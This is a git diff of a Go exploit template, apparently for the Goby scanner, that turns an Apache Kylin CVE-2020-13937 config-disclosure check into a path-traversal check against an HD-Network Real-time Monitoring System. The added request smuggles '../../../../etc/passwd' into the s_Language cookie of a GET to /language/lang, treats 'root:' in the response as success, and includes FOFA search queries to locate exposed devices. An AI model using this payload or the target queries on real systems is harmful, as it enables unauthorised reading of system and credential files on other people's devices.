@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Apache Kylin config 未授权配置泄露 CVE-2020-13937",
+  "Name": "UpdateStar HD-Network Real-time Monitoring dir list",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "app=\"APACHE-kylin\" || product=\"APACHE-kylin\" || title=\"kylin\"",
-  "GobyQuery": "app=\"APACHE-kylin\" || product=\"APACHE-kylin\" || title=\"kylin\"",
+  "FofaQuery": "app=\"HD-Network-RMS\" || body=\"labPSW\" || product=\"HD-Network-RMS\"",
+  "GobyQuery": "app=\"HD-Network-RMS\" || body=\"labPSW\" || product=\"HD-Network-RMS\"",
   "Level": "2",
   "Impact": "",
   "Recommendation": "",
@@ -30,9 +30,11 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/kylin/api/admin/config",
+        "uri": "/language/lang",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Cookie": "s_asptitle=HD-Network%20Real-time%20Monitoring%20System%20V2.0; s_Language=../../../../../../../../../../../../../../etc/passwd; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype="
+        },
         "data_type": "text",
         "data": ""
       },
@@ -51,7 +53,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "kylin.metadata.",
+            "value": "root:",
             "bz": ""
           }
         ]
@@ -107,7 +109,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Apache Kylin config 未授权配置泄露 CVE-2020-13937",
+      "Name": "UpdateStar HD-Network Real-time Monitoring dir list",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +118,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Apache Kylin config Unauthorized Configuration Disclosure CVE-2020-13937",
+      "Name": "UpdateStar HD-Network Real-time Monitoring dir list",
       "Product": "",
       "Description": "",
       "Recommendation": "",
